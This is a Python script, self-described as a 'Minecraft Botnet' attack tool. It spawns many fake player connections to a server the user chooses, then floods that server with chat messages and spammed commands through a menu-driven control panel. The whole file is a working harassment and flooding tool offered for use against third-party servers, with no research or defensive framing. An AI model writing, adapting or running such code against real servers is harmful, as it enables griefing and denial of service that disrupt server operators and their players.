#!/usr/bin/env python3
"""
Minecraft Botnet - Mass griefing, spamming, and exploitation
"""

import socket
import threading
import time
import random
import struct
import sys
import os

# ========== COLOR CODES ==========
class Colors:
    # Regular Colors
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    
    # Bold Colors
    BOLD_BLACK = '\033[1;30m'
    BOLD_RED = '\033[1;31m'
    BOLD_GREEN = '\033[1;32m'
    BOLD_YELLOW = '\033[1;33m'
    BOLD_BLUE = '\033[1;34m'
    BOLD_MAGENTA = '\033[1;35m'
    BOLD_CYAN = '\033[1;36m'
    BOLD_WHITE = '\033[1;37m'
    
    # Styles
    BOLD = '\033[1m'
    DIM = '\033[2m'
    END = '\033[0m'

# ========== MINECRAFT BOT CLASS ==========
class MinecraftBot:
    def __init__(self, server_ip, server_port=25565, username=None):
        self.server_ip = server_ip
        self.server_port = server_port
        self.username = username or f"Bot_{random.randint(1000, 9999)}"
        self.socket = None
        self.connected = False
        
    def connect(self):
        """Connect to Minecraft server"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(5)
            self.socket.connect((self.server_ip, self.server_port))
            
            # Send handshake
            self.send_handshake()
            
            # Send login start
            self.send_login_start()
            
            self.connected = True
            return True
            
        except Exception as e:
            return False
    
    def send_handshake(self):
        """Send handshake packet"""
        protocol_version = 758
        
        # Build packet
        data = b''
        data += self.encode_varint(protocol_version)
        data += self.encode_string(self.server_ip)
        data += struct.pack('>H', self.server_port)
        data += self.encode_varint(2)
        
        packet = self.encode_varint(len(data) + 1)
        packet += self.encode_varint(0x00)
        packet += data
        
        self.socket.send(packet)
    
    def send_login_start(self):
        """Send login start packet"""
        data = self.encode_string(self.username)
        
        packet = self.encode_varint(len(data) + 1)
        packet += self.encode_varint(0x00)
        packet += data
        
        self.socket.send(packet)
    
    def encode_varint(self, value):
        """Encode varint"""
        data = b''
        while True:
            temp = value & 0x7F
            value >>= 7
            if value != 0:
                temp |= 0x80
            data += bytes([temp])
            if value == 0:
                break
        return data
    
    def encode_string(self, string):
        """Encode string"""
        encoded = string.encode('utf-8')
        return self.encode_varint(len(encoded)) + encoded
    
    def send_chat(self, message):
        """Send chat message"""
        if not self.connected:
            return False
        
        try:
            data = self.encode_string(message)
            
            packet = self.encode_varint(len(data) + 1)
            packet += self.encode_varint(0x03)
            packet += data
            
            self.socket.send(packet)
            return True
            
        except:
            self.connected = False
            return False
    
    def disconnect(self):
        """Disconnect from server"""
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
        self.connected = False

# ========== BOTNET CLASS ==========
class MinecraftBotnet:
    def __init__(self, server_ip, server_port=25565):
        self.server_ip = server_ip
        self.server_port = server_port
        self.bots = []
        self.running = False
        self.stats = {'sent': 0, 'errors': 0}
        
    def create_bots(self, count=10):
        """Create bot army"""
        print(f"\n{Colors.BOLD_YELLOW}[*]{Colors.END} Creating {Colors.CYAN}{count}{Colors.END} bots...")
        
        for i in range(count):
            username = f"Bot_{i:04d}_{random.randint(1000,9999)}"
            bot = MinecraftBot(self.server_ip, self.server_port, username)
            self.bots.append(bot)
            
            # Show progress
            if (i + 1) % 5 == 0 or i + 1 == count:
                print(f"{Colors.GREEN}[+]{Colors.END} Created {Colors.CYAN}{i+1}{Colors.END}/{count} bots")
        
        print(f"{Colors.GREEN}[✓]{Colors.END} {Colors.BOLD}{len(self.bots)}{Colors.END} bots created successfully!")
        return len(self.bots)
    
    def connect_bots(self, max_connections=10):
        """Connect bots to server"""
        print(f"\n{Colors.BOLD_YELLOW}[*]{Colors.END} Connecting bots (max {Colors.CYAN}{max_connections}{Colors.END} concurrent)...")
        
        connected = 0
        threads = []
        
        def connect_bot(bot):
            nonlocal connected
            if bot.connect():
                connected += 1
        
        # Connect in batches
        for i in range(0, len(self.bots), max_connections):
            batch = self.bots[i:i+max_connections]
            batch_threads = []
            
            for bot in batch:
                t = threading.Thread(target=connect_bot, args=(bot,))
                batch_threads.append(t)
                threads.append(t)
                t.start()
            
            # Wait for batch
            for t in batch_threads:
                t.join()
            
            # Show progress
            print(f"{Colors.CYAN}[i]{Colors.END} Connected: {Colors.GREEN}{connected}{Colors.END}/{len(self.bots)}")
            time.sleep(1)
        
        print(f"{Colors.GREEN}[✓]{Colors.END} Total connected: {Colors.BOLD}{connected}{Colors.END}/{len(self.bots)}")
        return connected
    
    def chat_flood(self, messages, delay=0.1):
        """Flood server chat"""
        print(f"\n{Colors.BOLD_MAGENTA}[*]{Colors.END} Starting {Colors.BOLD}CHAT FLOOD{Colors.END}")
        
        self.running = True
        self.stats = {'sent': 0, 'errors': 0}
        active_bots = [bot for bot in self.bots if bot.connected]
        
        print(f"{Colors.CYAN}[i]{Colors.END} Active bots: {len(active_bots)}")
        
        def flood_bot(bot):
            while self.running and bot.connected:
                message = random.choice(messages)
                if bot.send_chat(message):
                    self.stats['sent'] += 1
                else:
                    self.stats['errors'] += 1
                time.sleep(delay + random.random() * 0.1)
        
        # Start threads
        threads = []
        for bot in active_bots:
            t = threading.Thread(target=flood_bot, args=(bot,))
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Show stats
        try:
            while self.running:
                time.sleep(2)
                print(f"\r{Colors.CYAN}[STATS]{Colors.END} Sent: {Colors.GREEN}{self.stats['sent']}{Colors.END} | Errors: {Colors.RED}{self.stats['errors']}{Colors.END} | Bots: {len(active_bots)}", end="")
        except KeyboardInterrupt:
            self.running = False
            print(f"\n{Colors.YELLOW}[!]{Colors.END} Stopping chat flood")
            print(f"{Colors.GREEN}[✓]{Colors.END} Final stats - Sent: {self.stats['sent']}, Errors: {self.stats['errors']}")
    
    def command_spam(self, commands, delay=0.5):
        """Spam server commands"""
        print(f"\n{Colors.BOLD_MAGENTA}[*]{Colors.END} Starting {Colors.BOLD}COMMAND SPAM{Colors.END}")
        
        self.running = True
        self.stats = {'sent': 0, 'errors': 0}
        active_bots = [bot for bot in self.bots if bot.connected]
        
        def spam_bot(bot):
            while self.running and bot.connected:
                command = random.choice(commands)
                if bot.send_chat(command):
                    self.stats['sent'] += 1
                else:
                    self.stats['errors'] += 1
                time.sleep(delay + random.random() * 0.2)
        
        threads = []
        for bot in active_bots:
            t = threading.Thread(target=spam_bot, args=(bot,))
            t.daemon = True
            t.start()
            threads.append(t)
        
        try:
            while self.running:
                time.sleep(2)
                print(f"\r{Colors.CYAN}[STATS]{Colors.END} Commands: {Colors.GREEN}{self.stats['sent']}{Colors.END} | Errors: {Colors.RED}{self.stats['errors']}{Colors.END}", end="")
        except KeyboardInterrupt:
            self.running = False
            print(f"\n{Colors.YELLOW}[!]{Colors.END} Stopping command spam")
    
    def disconnect_all(self):
        """Disconnect all bots"""
        print(f"\n{Colors.BOLD_YELLOW}[*]{Colors.END} Disconnecting bots...")
        
        for i, bot in enumerate(self.bots):
            bot.disconnect()
            if (i + 1) % 10 == 0:
                print(f"{Colors.YELLOW}[!]{Colors.END} Disconnected {i+1}/{len(self.bots)}")
        
        print(f"{Colors.GREEN}[✓]{Colors.END} All bots disconnected")

# ========== MAIN FUNCTION ==========
def main():
    # Clear screen
    os.system('cls' if os.name == 'nt' else 'clear')
    
    # Banner
    banner = f"""
{Colors.BOLD_RED}╔══════════════════════════════════════════════════════════════════╗
║                                                                      
║{Colors.BOLD_WHITE}  ███╗   ███╗██╗███╗   ██╗███████╗ ██████╗██████╗  █████╗ ███████╗████████╗{Colors.BOLD_RED}  
║{Colors.BOLD_WHITE}  ████╗ ████║██║████╗  ██║██╔════╝██╔════╝██╔══██╗██╔══██╗██╔════╝╚══██╔══╝{Colors.BOLD_RED}  
║{Colors.BOLD_WHITE}  ██╔████╔██║██║██╔██╗ ██║█████╗  ██║     ██████╔╝███████║███████╗   ██║   {Colors.BOLD_RED}  
║{Colors.BOLD_WHITE}  ██║╚██╔╝██║██║██║╚██╗██║██╔══╝  ██║     ██╔══██╗██╔══██║╚════██║   ██║   {Colors.BOLD_RED}  
║{Colors.BOLD_WHITE}  ██║ ╚═╝ ██║██║██║ ╚████║███████╗╚██████╗██║  ██║██║  ██║███████║   ██║   {Colors.BOLD_RED}  
║{Colors.BOLD_WHITE}  ╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝   {Colors.BOLD_RED}  
║                                                                      
║{Colors.BOLD_CYAN}                    B O T N E T   V 2 . 0                              {Colors.BOLD_RED}     
║{Colors.BOLD_YELLOW}              Minecraft Attack & Exploitation Tool                      {Colors.BOLD_RED}     
║{Colors.BOLD_RED}╚══════════════════════════════════════════════════════════════════╝{Colors.END}
    """
    
    print(banner)
    
    # Get target information
    print(f"\n{Colors.BOLD_GREEN}[?]{Colors.END} Enter target server information:")
    
    if len(sys.argv) > 1:
        server_ip = sys.argv[1]
        print(f"{Colors.CYAN}[i]{Colors.END} Using IP: {server_ip}")
    else:
        server_ip = input(f"{Colors.CYAN}[?]{Colors.END} Server IP: ").strip()
    
    if len(sys.argv) > 2:
        server_port = int(sys.argv[2])
        print(f"{Colors.CYAN}[i]{Colors.END} Using port: {server_port}")
    else:
        port_input = input(f"{Colors.CYAN}[?]{Colors.END} Port [25565]: ").strip()
        server_port = int(port_input) if port_input else 25565
    
    if len(sys.argv) > 3:
        bot_count = int(sys.argv[3])
        print(f"{Colors.CYAN}[i]{Colors.END} Using {bot_count} bots")
    else:
        bot_input = input(f"{Colors.CYAN}[?]{Colors.END} Number of bots [10]: ").strip()
        bot_count = int(bot_input) if bot_input else 10
    
    print(f"\n{Colors.BOLD_WHITE}[TARGET]{Colors.END} {Colors.CYAN}{server_ip}:{server_port}{Colors.END}")
    print(f"{Colors.BOLD_WHITE}[BOTS]{Colors.END} {Colors.CYAN}{bot_count}{Colors.END}")
    
    # Check server connection
    print(f"\n{Colors.BOLD_YELLOW}[*]{Colors.END} Checking server connection...")
    test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    test_sock.settimeout(3)
    result = test_sock.connect_ex((server_ip, server_port))
    test_sock.close()
    
    if result == 0:
        print(f"{Colors.GREEN}[✓]{Colors.END} Server is online!")
    else:
        print(f"{Colors.RED}[✗]{Colors.END} Server is offline or not responding")
        retry = input(f"{Colors.YELLOW}[?]{Colors.END} Continue anyway? (y/n): ").strip().lower()
        if retry != 'y':
            print(f"{Colors.RED}[!]{Colors.END} Exiting...")
            sys.exit(1)
    
    # Create botnet
    botnet = MinecraftBotnet(server_ip, server_port)
    botnet.create_bots(bot_count)
    
    # Connect bots
    input(f"\n{Colors.BOLD_GREEN}[?]{Colors.END} Press Enter to connect bots...")
    connected = botnet.connect_bots(max_connections=min(20, bot_count))
    
    if connected == 0:
        print(f"\n{Colors.BOLD_RED}[!]{Colors.END} No bots connected. Exiting.")
        sys.exit(1)
    
    # Main menu
    while True:
        print(f"\n{Colors.BOLD_CYAN}╔════════════════════════════════════════════════════════════╗{Colors.END}")
        print(f"{Colors.BOLD_CYAN}║{Colors.END}              {Colors.BOLD_WHITE}BOTNET CONTROL PANEL{Colors.END}              {Colors.BOLD_CYAN}║{Colors.END}")
        print(f"{Colors.BOLD_CYAN}╠════════════════════════════════════════════════════════════╣{Colors.END}")
        print(f"{Colors.BOLD_CYAN}║{Colors.END}  {Colors.BOLD_GREEN}Target:{Colors.END} {Colors.CYAN}{server_ip}:{server_port}{Colors.END}                           {Colors.BOLD_CYAN}║{Colors.END}")
        print(f"{Colors.BOLD_CYAN}║{Colors.END}  {Colors.BOLD_GREEN}Bots:{Colors.END} {Colors.CYAN}{connected}/{bot_count}{Colors.END} connected                          {Colors.BOLD_CYAN}║{Colors.END}")
        print(f"{Colors.BOLD_CYAN}╠════════════════════════════════════════════════════════════╣{Colors.END}")
        print(f"{Colors.BOLD_CYAN}║{Colors.END}  {Colors.BOLD_YELLOW}[1]{Colors.END} {Colors.WHITE}Chat Flood{Colors.END}          {Colors.BOLD_YELLOW}[5]{Colors.END} {Colors.WHITE}Check Server{Colors.END}         {Colors.BOLD_CYAN}║{Colors.END}")
        print(f"{Colors.BOLD_CYAN}║{Colors.END}  {Colors.BOLD_YELLOW}[2]{Colors.END} {Colors.WHITE}Command Spam{Colors.END}        {Colors.BOLD_YELLOW}[6]{Colors.END} {Colors.WHITE}Bot Status{Colors.END}           {Colors.BOLD_CYAN}║{Colors.END}")
        print(f"{Colors.BOLD_CYAN}║{Colors.END}  {Colors.BOLD_YELLOW}[3]{Colors.END} {Colors.WHITE}Movement Flood{Colors.END}      {Colors.BOLD_YELLOW}[7]{Colors.END} {Colors.WHITE}Reconnect Bots{Colors.END}      {Colors.BOLD_CYAN}║{Colors.END}")
        print(f"{Colors.BOLD_CYAN}║{Colors.END}  {Colors.BOLD_YELLOW}[4]{Colors.END} {Colors.WHITE}Inventory Spam{Colors.END}      {Colors.BOLD_YELLOW}[8]{Colors.END} {Colors.WHITE}Disconnect All{Colors.END}      {Colors.BOLD_CYAN}║{Colors.END}")
        print(f"{Colors.BOLD_CYAN}╠════════════════════════════════════════════════════════════╣{Colors.END}")
        print(f"{Colors.BOLD_CYAN}║{Colors.END}  {Colors.BOLD_YELLOW}[0]{Colors.END} {Colors.RED}Exit{Colors.END}                                            {Colors.BOLD_CYAN}║{Colors.END}")
        print(f"{Colors.BOLD_CYAN}╚════════════════════════════════════════════════════════════╝{Colors.END}")
        
        choice = input(f"\n{Colors.BOLD_GREEN}[?]{Colors.END} Select option: ").strip()
        
        if choice == "1":
            # Chat flood
            messages = [
                "Hello!",
                "This is a bot",
                "Spam message",
                "Minecraft server",
                "Botnet attack",
                "Get rekt",
                "LOL",
                "GG",
                "EZ",
                "BOT ARMY"
            ]
            
            custom = input(f"{Colors.CYAN}[?]{Colors.END} Use custom message? (y/n): ").strip().lower()
            if custom == 'y':
                msg = input(f"{Colors.CYAN}[?]{Colors.END} Enter message: ").strip()
                messages = [msg] * 5
            
            delay = input(f"{Colors.CYAN}[?]{Colors.END} Delay (seconds) [0.1]: ").strip()
            delay = float(delay) if delay else 0.1
            
            botnet.chat_flood(messages, delay)
        
        elif choice == "2":
            # Command spam
            commands = [
                "/help", "/list", "/me is bot",
                "/spawn", "/home", "/tpa bot",
                "/msg admin hi", "/ping", "/stats"
            ]
            
            custom = input(f"{Colors.CYAN}[?]{Colors.END} Use custom command? (y/n): ").strip().lower()
            if custom == 'y':
                cmd = input(f"{Colors.CYAN}[?]{Colors.END} Enter command: ").strip()
                commands = [cmd] * 3
            
            delay = input(f"{Colors.CYAN}[?]{Colors.END} Delay (seconds) [0.5]: ").strip()
            delay = float(delay) if delay else 0.5
            
            botnet.command_spam(commands, delay)
        
        elif choice == "3":
            print(f"{Colors.YELLOW}[!]{Colors.END} Movement flood feature coming soon...")
            time.sleep(2)
        
        elif choice == "4":
            print(f"{Colors.YELLOW}[!]{Colors.END} Inventory spam feature coming soon...")
            time.sleep(2)
        
        elif choice == "5":
            # Check server
            print(f"\n{Colors.BOLD_YELLOW}[*]{Colors.END} Checking server...")
            test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            test_sock.settimeout(3)
            result = test_sock.connect_ex((server_ip, server_port))
            test_sock.close()
            
            if result == 0:
                print(f"{Colors.GREEN}[✓]{Colors.END} Server is online!")
            else:
                print(f"{Colors.RED}[✗]{Colors.END} Server is offline!")
            
            input(f"\n{Colors.DIM}Press Enter to continue...{Colors.END}")
        
        elif choice == "6":
            # Bot status
            active = len([b for b in botnet.bots if b.connected])
            print(f"\n{Colors.BOLD_CYAN}══════════ BOT STATUS ══════════{Colors.END}")
            print(f"{Colors.GREEN}Connected:{Colors.END} {active}/{len(botnet.bots)}")
            print(f"{Colors.RED}Disconnected:{Colors.END} {len(botnet.bots) - active}/{len(botnet.bots)}")
            
            if active > 0:
                print(f"\n{Colors.CYAN}Active bots:{Colors.END}")
                for i, bot in enumerate(botnet.bots[:5]):  # Show first 5
                    if bot.connected:
                        print(f"  {Colors.GREEN}•{Colors.END} {bot.username}")
            
            input(f"\n{Colors.DIM}Press Enter to continue...{Colors.END}")
        
        elif choice == "7":
            # Reconnect bots
            print(f"\n{Colors.BOLD_YELLOW}[*]{Colors.END} Reconnecting bots...")
            disconnected = [b for b in botnet.bots if not b.connected]
            
            if disconnected:
                for bot in disconnected:
                    if bot.connect():
                        connected += 1
                    time.sleep(0.5)
                print(f"{Colors.GREEN}[✓]{Colors.END} Reconnected {len(disconnected)} bots")
            else:
                print(f"{Colors.YELLOW}[!]{Colors.END} All bots already connected")
            
            input(f"\n{Colors.DIM}Press Enter to continue...{Colors.END}")
        
        elif choice == "8":
            # Disconnect all
            botnet.disconnect_all()
            connected = 0
            input(f"\n{Colors.DIM}Press Enter to continue...{Colors.END}")
        
        elif choice == "0":
            print(f"\n{Colors.BOLD_YELLOW}[!]{Colors.END} Disconnecting bots and exiting...")
            botnet.disconnect_all()
            print(f"{Colors.GREEN}[✓]{Colors.END} Goodbye!")
            break
        
        else:
            print(f"{Colors.RED}[✗]{Colors.END} Invalid option!")
            time.sleep(1)

# ========== RUN ==========
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.BOLD_RED}[!]{Colors.END} Interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.BOLD_RED}[!]{Colors.END} Error: {e}")
        sys.exit(1)